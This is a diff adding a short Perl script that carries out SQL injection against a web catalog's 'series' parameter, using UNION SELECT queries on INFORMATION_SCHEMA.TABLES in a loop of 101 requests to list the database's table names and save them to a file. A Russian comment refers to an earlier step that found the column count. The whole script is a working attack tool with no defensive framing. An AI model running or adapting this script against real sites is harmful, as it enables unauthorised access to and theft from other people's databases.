@@ -1,0 +1,38 @@
+
+#!/usr/bin/perl
+
+use Data::Dumper;
+use warnings;
+#use strict;
+use HTTP::Cookies;
+use MIME::Base64;
+use LWP::UserAgent;
+
+my $ua=LWP::UserAgent->new;
+my $request;
+for my $i(0..100){
+my $n=0;
+#количество единиц, и table-name получаем на предыдущем шаге
+$request = new HTTP::Request(GET =>"http://example.ru/catalog?series=3 UNION SELECT 1, 2, 3, 4, 5, TABLE_NAME, 7, 8, 9, 10, 11, 12, 13 FROM INFORMATION_SCHEMA.TABLES LIMIT $i,1 --");
+my $response=$ua->request($request);
+#warn $response->content;
+$message=$response->content;
+open (FILE, ">>1"); 
+#print FILE $response->content;
+for my $s (split ('\r?\n', $message))
+{
+
+if ($n==1)
+{
+	$n=0;	
+	warn $s;
+	print (FILE "$s\n");
+}
+#warn $s;
+if ($s=~m/<div class="section-info">/){
+	$n=1;
+}
+ } 
+# warn $response->content;
+
+}
